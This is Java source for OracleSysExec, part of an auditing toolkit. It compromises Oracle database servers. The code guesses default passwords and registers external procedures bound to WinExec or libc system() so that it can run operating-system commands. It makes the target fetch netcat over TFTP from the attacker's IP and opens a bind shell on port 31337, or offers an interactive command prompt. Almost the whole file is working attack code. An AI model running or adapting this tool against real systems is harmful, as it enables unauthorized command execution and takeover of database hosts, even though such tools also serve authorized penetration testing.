/* 
   Oracle Auditing Tools
   Copyright (C) Patrik Karlsson 2002
   
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.
   
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.
   
   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

/*
  Changes
  2002-06-03 - Loop through all sids when trying to find a valid account.
  2002-09-15 - Fixed null pointer exceptions when oracle version was not correctly detected.

*/

package ork;

import java.sql.*;
import java.util.*;
import java.io.*;
import oracle.jdbc.driver.*;
import gnu.getopt.*;

public class OracleSysExec {

    static Connection m_oConn = null;
    static boolean m_bDebug = false; /* should we be verbose or not */
    static String m_sTemp = null;
    static String m_sOracleVersion = null;

    private static String m_sVersion = OATVersion.getVersion();
    private static String m_sAuthor = OATVersion.getAuthor();
    
    /*
      wrapper for execute query
     */
    private static void exec(String sQuery) {

	try {
	    Statement oStmt = m_oConn.createStatement();
	    oStmt.executeQuery(sQuery);
	}
	catch ( SQLException e ) {
	    System.out.println("ERROR: " + sQuery);
	    e.printStackTrace();
	}

    }

    private static void usage() {

	System.out.println("\tOracleSysExec " + m_sVersion + m_sAuthor );
	System.out.println("\t----------------------------------------");
	System.out.println("\tOracleSysExec [options]");
	System.out.println("\t\t-s*\t<servername>");
	System.out.println("\t\t-u\t<username>");
	System.out.println("\t\t-p\t<password>");
	System.out.println("\t\t-d\t<SID>");
	System.out.println("\t\t-P\t<portnr>");
	System.out.println("\t\t-l\t<localIP>");
	System.out.println("\t\t-T\t<temppath>");
	System.out.println("\t\t-t\t<platform>");
	System.out.println("\t\t-I\tinteractive mode");
	System.out.println("\t\t-v\tbe verbose");
	System.out.println("");

    }
    
    /*
      Clean up after us
    */
    private static void cleanup() {

	// drop some stuff !
	if ( m_bDebug )
	    System.out.println("INFO: Cleaning up haxxor stuff ...");

	/* this is probably a Windows Box */
	if ( m_sOracleVersion.indexOf("Windows") != -1 ) {
	    //execHaxxorCmd("cmd /c del /f " +m_sTemp+ "\\nc.exe");
	    exec("drop library elite_haxxor_lib");
	    exec("drop function elite_haxxor_function");
	}
	else {
	    exec("drop package shell");
	    exec("drop function haxxor_function");
	    exec("drop library haxxor");
	}

    }

    /*
      Create the fun stuff
    */
    private static void createStuff() {

	if ( m_bDebug )
	    System.out.println("INFO: Creating haxxor stuff ...");

	if ( ( m_sOracleVersion == null ) || ( m_sOracleVersion.equalsIgnoreCase("unknown") ) ) {
	    System.err.println("ERROR: Could not automaticaly detect platform. Use -t switch.");
	    System.exit(1);
	}

	/* this is probably a Windows Box */
	if ( m_sOracleVersion.indexOf("Windows") != -1 ) {
	    exec("create library elite_haxxor_lib as '%windir%\\system32\\kernel32.dll';");
	    exec("create function elite_haxxor_function ( lpCmdLine varchar2, nCmdShow varchar2 ) " +
		 "return int as external LANGUAGE C NAME \"WinExec\" LIBRARY elite_haxxor_lib;");
	}
	/* this is propably a UN*X box */
	else if ( m_sOracleVersion.indexOf("Solaris") != -1 ) {
	    System.out.println("Adding haxxor stuff for Solaris ... ");
      	    exec("create or replace library haxxor as '/lib/libc.so.1';");
	    exec("create or replace function haxxor_function ( sCmd varchar2 ) " + 
		 "return int as external LANGUAGE C NAME \"system\" library haxxor;");

	    exec("create or replace package shell is procedure exec(command in char); end shell;");
	    exec("create or replace package body shell is procedure exec(command in char) is external " +
	    "name \"system\" library haxxor language c; end shell;");
	}

    }

    /*
      The wrapper for the extproc in Oracle
    */
    private static void execHaxxorCmd(String sCMD) {
	
	if ( m_bDebug )
	    System.out.println("INFO: Executing haxxor cmd " + sCMD );

	try {
	    /* The server is running winblows ... */
	    if ( m_sOracleVersion.indexOf("Windows") != -1 ) {
		sCMD = "cmd /c " + sCMD;
		String sSQL = "{ ? = call elite_haxxor_function(?, ?) }";
		CallableStatement oCStmt = m_oConn.prepareCall(sSQL);
		oCStmt.registerOutParameter(1, OracleTypes.INTEGER);
		oCStmt.setString(2, sCMD);
		oCStmt.setString(3, "1");
		oCStmt.execute();
	    }
	    else if ( m_sOracleVersion.indexOf("Solaris") != -1 ) {
		String sSQL = "{ ? = call haxxor_function(?) }";
		CallableStatement oCStmt = m_oConn.prepareCall(sSQL);
		oCStmt.registerOutParameter(1, OracleTypes.INTEGER);
		oCStmt.setString(2, sCMD);
		oCStmt.execute();
	    }
	}
	catch( SQLException e ) {
	    /* 
	       A stupid ORA-28576 RPC error seems to be generated all the time
	       Doesn't seem to stop my evil plans so who cares ?!
	       If anyone has a solution to this, please mail me: patrik@cqure.net
	    */
	    /*
	    System.out.println("ERROR: Rpc kool error, please ignore...");
	    e.printStackTrace(); 
	    */
	}

    }

    /*
      Main function
    */
    public static void main (String args []) {

	String sHostName = null;
	String sDataBase = null;
	String sUserName = null;
	String sPassWord = null;
	String sLocalIP = null;

	int nOraclePort = 1521;
	Getopt oOpt = new Getopt("OracleSysExec", args, "s:d:u:p:hP:l:vIT:t:");
	int c;
	String arg;
	SimpleServer oTFTPServer = null;
	OracleTNSSocket oTNSSock;
	Vector oSIDVector = new Vector();
	
	String sConnectionURL = null;

	boolean bInteractiveMode = false;

	/* parse arguments */
	while ( ( c = oOpt.getopt() ) != -1 ) {

	    switch( c ) {

	    case 's':
		arg = oOpt.getOptarg();
		sHostName = arg;
		break;
		
	    case 'd':
		arg = oOpt.getOptarg();
		sDataBase = arg;
		break;

	    case 'u':
		arg = oOpt.getOptarg();
		sUserName = arg;
		break;
		
	    case 'p':
		arg = oOpt.getOptarg();
		sPassWord = arg;
		break;

	    case 'P':
		arg = oOpt.getOptarg();
		nOraclePort = Integer.parseInt(arg);
		break;

	    case 'T':
		arg = oOpt.getOptarg();
		m_sTemp = arg;
		break;
		
	    case 'l':
		arg = oOpt.getOptarg();
		sLocalIP = arg;
		break;

	    case 'h':
		usage();
		System.exit(1);
		break;

	    case 'v':
		m_bDebug = true;
		break;

	    case 'I':
		bInteractiveMode = true;
		break;

	    case 't':
		arg = oOpt.getOptarg();
		
		if ( arg.equals("Windows") || arg.equals("Solaris") ) {
		    m_sOracleVersion = arg;
		}
		else {
		    System.out.println("Invalid platform. Currently supported platforms are:");
		    System.out.println("Windows");
		    System.out.println("Solaris");
		    System.exit(1);
		}

		break;

	    default:
		usage();
		System.exit(0);
	    }

	}

	/* do we have all the parameters needed */
	if ( sHostName == null ) {
	    usage();
	    System.exit(0);
	}

	if ( m_sTemp == null ) {
	    m_sTemp = "%temp%";
	}
	else {
	    /* remove trailing backslashes */
	    while( m_sTemp.charAt(m_sTemp.length()-1) == '\\' ) {
		m_sTemp = m_sTemp.substring(0, m_sTemp.length() - 1);
	    }
	}

	/* Do some bragging */

	System.out.println("OracleSysExec " + m_sVersion + " by " + m_sAuthor );
	System.out.println("----------------------------------------");

	/* Try to retrieve the database SID */
	if ( sDataBase == null ) {

	    oTNSSock = new OracleTNSSocket( sHostName, nOraclePort );
	    oTNSSock.connect();
	    oSIDVector = oTNSSock.getOracleSIDS();

	    if ( oSIDVector != null && oSIDVector.get(0) != null )
		sDataBase = (String) oSIDVector.get(0);
	    else {
		System.err.println("ERROR: Failed to fetch ORACLE SID");
		System.exit(1);
	    }

	    oTNSSock.close();
	}
	else
	    oSIDVector.add(sDataBase);

	/* 
	   do we have the local IP set ? 
	   If not try to figure it out
	*/
	if ( sLocalIP == null ) {

	    oTNSSock = new OracleTNSSocket( sHostName, nOraclePort );

	    if ( !oTNSSock.connect() ) {
		System.err.println("ERROR: Could not connect to ORACLE server");
		System.exit(1);
	    }

	    sLocalIP = oTNSSock.getLocalIP();
	    System.out.println("INFO: Local IP seems to be " + sLocalIP );
	    oTNSSock.close();
	}

	/* Try to determine OS */
	oTNSSock = new OracleTNSSocket( sHostName, nOraclePort );
	oTNSSock.connect();

	if ( m_sOracleVersion == null )
	    m_sOracleVersion = oTNSSock.getOracleVersion();

	oTNSSock.close();

	/* Start our TFTP server */
	oTFTPServer = new SimpleServer();

	/*
	  Lets try to load the Oracle JDBC driver
	*/
	try {
	    Class.forName("oracle.jdbc.driver.OracleDriver");
	}
	catch( ClassNotFoundException e ) {
	    System.err.println("ERROR: Could not load JDBC driver. Make sure it's in the classpath");
	    System.exit(1);
	}


	/* loop through all SIDS */
	for ( int i=0; i<oSIDVector.size(); i++ ) {
	    
	    sDataBase = (String) oSIDVector.get(i);

	    /* build a connection URL based on the input */
	    sConnectionURL = "jdbc:oracle:thin:@" + sHostName + ":" + nOraclePort;
	    sConnectionURL += ":" + sDataBase;
	    
	    if ( m_bDebug )
		System.out.println("DEBUG: SID " + sDataBase + " found");

	    if ( sUserName != null && sPassWord != null ) {

		/*
		  Ok so the Driver loaded, let's try to login
		*/
		try {
		    m_oConn = DriverManager.getConnection (sConnectionURL,sUserName, sPassWord);
		}
		catch ( SQLException e ) {
		    //e.printStackTrace();
		    /* System.out.println("ERROR: Could not connect to ORACLE server.");
		       System.exit(0); */
		}

	    }
	    else {
		/* 
		   Try to get an account with sufficent privileges to exploit 
		*/                                         
		boolean bCheckPerm = true;
		boolean bReturnFirst = true;
		m_oConn = OraclePwGuess.checkDefaultPasswords(sConnectionURL, 
							      bCheckPerm,
							      bReturnFirst);
	    }

	    /* if we have an account to exploit eject ! */
	    if ( m_oConn != null )
		break;
	    
	}

	if ( m_oConn == null ) {
	    System.out.println("ERROR: Failed to connect to ORACLE server");
	    System.exit(1);
	}

	createStuff();

	/* should we be interactive or just create a shell */
	if ( !bInteractiveMode ) {

	    if ( m_sOracleVersion.indexOf("Windows") != -1 ) {
		System.out.println("INFO: Uploading netcat to Oracle Server");
		execHaxxorCmd("tftp -i " +sLocalIP+ " get windows/netcat/nc.exe " +m_sTemp+ "\\nc.exe");
	    }
	    else if (  m_sOracleVersion.indexOf("Solaris") != -1 ) {
		System.out.println("INFO: Uploading netcat to Oracle Server");
		execHaxxorCmd("echo tftp \"" + sLocalIP + "<< EOF\" > foobaz.sh");
		execHaxxorCmd("echo \"mode binary\" >> foobaz.sh");
		execHaxxorCmd("echo \"get solaris/netcat/nc\" >> foobaz.sh");
		execHaxxorCmd("echo \"quit\" >> foobaz.sh");
		execHaxxorCmd("echo \"EOF\" >> foobaz.sh");
		execHaxxorCmd("chmod +x `pwd`/nc");
		execHaxxorCmd("sh foobaz.sh");
	    }

	    System.out.println("INFO: Sleeping for 2 seconds");
	    try {
		Thread.currentThread().sleep(2000);
	    }
	    catch(InterruptedException e) {
		e.printStackTrace();
	    }

	    if ( m_sOracleVersion.indexOf("Windows") != -1 ) {
		System.out.println("INFO: Creating shell on port 31337 Oracle Server");
		execHaxxorCmd(m_sTemp+ "\\nc.exe -nvlp 31337 -e cmd.exe");
	    }
	    else if (  m_sOracleVersion.indexOf("Solaris") != -1 ) {
		System.out.println("INFO: Creating shell on port 31337");
		execHaxxorCmd("`pwd`/nc -nvlp 31337 -e /usr/bin/bash");
	    }
	}
	else {
	    String sCmd = "";
	    LineNumberReader oInReader = new LineNumberReader( new InputStreamReader( System.in ) );

	    while ( sCmd != null && !sCmd.equalsIgnoreCase("quit") ) {
		try {
		    if ( m_sOracleVersion.indexOf("Windows") != -1 )
			System.out.print("cmd /c> ");
		    else
			System.out.print("/bin/sh> ");

		    sCmd = oInReader.readLine();
		}
		catch ( IOException e ) {
		    e.printStackTrace();
		}

		if ( sCmd != null && !sCmd.equalsIgnoreCase("quit") && sCmd.length() > 0 )
		    execHaxxorCmd(sCmd);
	    }
	}

	System.out.println("INFO: Cleaning up !");
	cleanup();

	if ( !bInteractiveMode )
	    if ( m_sOracleVersion.indexOf("Windows") != -1 )
		System.out.println("INFO: The nc.exe will be left in " +m_sTemp);
	    else
		System.out.println("INFO: Don't forget to remove netcat when finished !");

	System.out.println("INFO: Stopping TFTP Server");
	oTFTPServer.stopServer();

    }
	
}
